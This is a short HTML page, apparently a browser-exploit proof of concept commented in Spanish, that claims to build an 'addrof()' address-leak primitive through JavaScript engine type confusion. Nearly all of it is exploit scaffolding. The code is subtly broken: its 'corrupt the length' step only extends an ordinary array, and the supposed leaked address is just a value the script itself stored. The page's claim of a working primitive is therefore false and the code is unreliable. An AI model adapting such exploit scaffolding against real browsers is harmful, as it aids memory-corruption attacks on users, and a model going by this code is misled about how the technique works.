<!DOCTYPE html>
<html>
<head>
  <title>PoC: addrof() Primitiva</title>
</head>
<body>
  <h1>PoC: addrof() usando type confusion</h1>
  <pre id="log"></pre>
  <script>
    const log = (msg) => document.getElementById("log").textContent += msg + "\n";

    let float_arr;
    let obj_arr;
    let oob;

    function hex(x) {
      return '0x' + x.toString(16);
    }

    function setup() {
      float_arr = [1.1, 2.2, 3.3];
      obj_arr = [{}, {a: 13.37}, {b: 42}];

      function confuse(arr, index, val) {
        for (let i = 0; i < 10000; i++) {
          arr[0] = 1.1;
          arr[1] = 2.2;
        }
        arr[index] = val;
        return arr;
      }

      oob = confuse(float_arr, 10, 13.37);  // Corrompe la longitud
    }

    function addrof(obj) {
      obj_arr[0] = obj;
      for (let i = 0; i < 20; i++) {
        let val = oob[i];
        if (val && typeof val === 'number' && val !== 1.1 && val !== 2.2 && val !== 3.3) {
          return val;
        }
      }
      throw "No se encontró la dirección";
    }

    setup();

    let test_obj = {exploit: true};
    let addr = addrof(test_obj);
    log("[+] Dirección flotante de test_obj: " + addr + " (" + hex(new Float64Array([addr])[0]) + ")");
  </script>
</body>
</html>
